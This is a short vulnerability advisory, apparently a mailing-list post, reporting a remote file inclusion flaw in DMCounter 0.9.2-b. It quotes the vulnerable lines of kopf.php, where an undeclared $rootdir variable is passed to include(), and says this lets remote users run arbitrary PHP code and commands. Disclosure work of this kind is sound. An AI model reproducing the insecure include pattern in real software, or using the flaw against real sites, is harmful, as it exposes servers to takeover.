Subject: DMCounter Remote File Include


Script: DMCounter
Version: 0.9.2-b
Language: PHP
Problem: Remote File Include
Vendor: http://sourceforge.net/projects/dmcounter
Discovered by: beford <xbefordx gmail com>

Description
=============
Statistics software based on PHP which does not require any database
support but just uses flat files. Daily + monthly visits, which pages, from
where, browsers and OSs are listed and visually presented

Problem
=============
A remote user can supply a specially crafted URL to cause the target
system to include and execute arbitrary PHP code from a remote
location. A remote user can execute arbitrary PHP code and operating
system commands on the target system with the privileges of the
target web service.

The vulnerable file is kopf.php

1 <?php
2 $basepath=getcwd();
3 include($rootdir.'/lang.php');

$rootdir is not being declared before using it in the include() function.
